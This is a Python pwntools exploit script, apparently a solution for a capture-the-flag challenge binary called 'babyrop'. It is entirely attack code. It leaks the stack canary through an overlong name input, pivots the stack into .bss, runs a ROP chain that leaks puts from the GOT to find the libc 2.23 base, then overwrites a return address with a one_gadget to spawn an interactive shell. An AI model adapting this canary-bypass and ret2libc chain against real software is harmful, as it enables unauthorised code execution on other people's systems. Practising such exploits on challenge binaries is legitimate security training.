#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'

p = process('./babyrop')
libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
elf = ELF('./babyrop')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

gdb.attach(p,'b *0x40072E')
p.recvuntil('What your name? \n')
p.sendline('a'*0x19)

p.recvuntil('Hello, ')
p.recvuntil('a'*0x18)

canary = u64(p.recv(8)) - 0x61

print "canary=>",hex(canary)
p.recvuntil('Please input the passwd to unlock this challenge\n')
p.sendline(str(0x4009AE))

# payload = 
bss_base = 0x000000000601010
bss = 0x000000000601800

# buf->bss
# 000000000040072E                 lea     rax, [rbp+buf]

pause()
payload = 'a'*0x18 + p64(canary) + p64(bss + 0x20) + p64(0x40072E)
pause()
p.send(payload)

#read to bss -> rop
pop_rdi_ret = 0x0000000000400913
start = 0x0000000000400630
leave_ret = 0x000000000400759
call_puts = 0x40086E

payload = flat(pop_rdi_ret,puts_got,call_puts)
payload += p64(canary) + p64(bss-0x8) + p64(leave_ret)

pause()
p.send(payload)

pause()
libc_base = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")-0x6f6a0
print "libc_base=>"+hex(libc_base)

one = libc_base+0x4527a

pause()
p.send("a"*0x18+p64(canary)+"Ev3rGl0w"+p64(one))
pause()
p.interactive()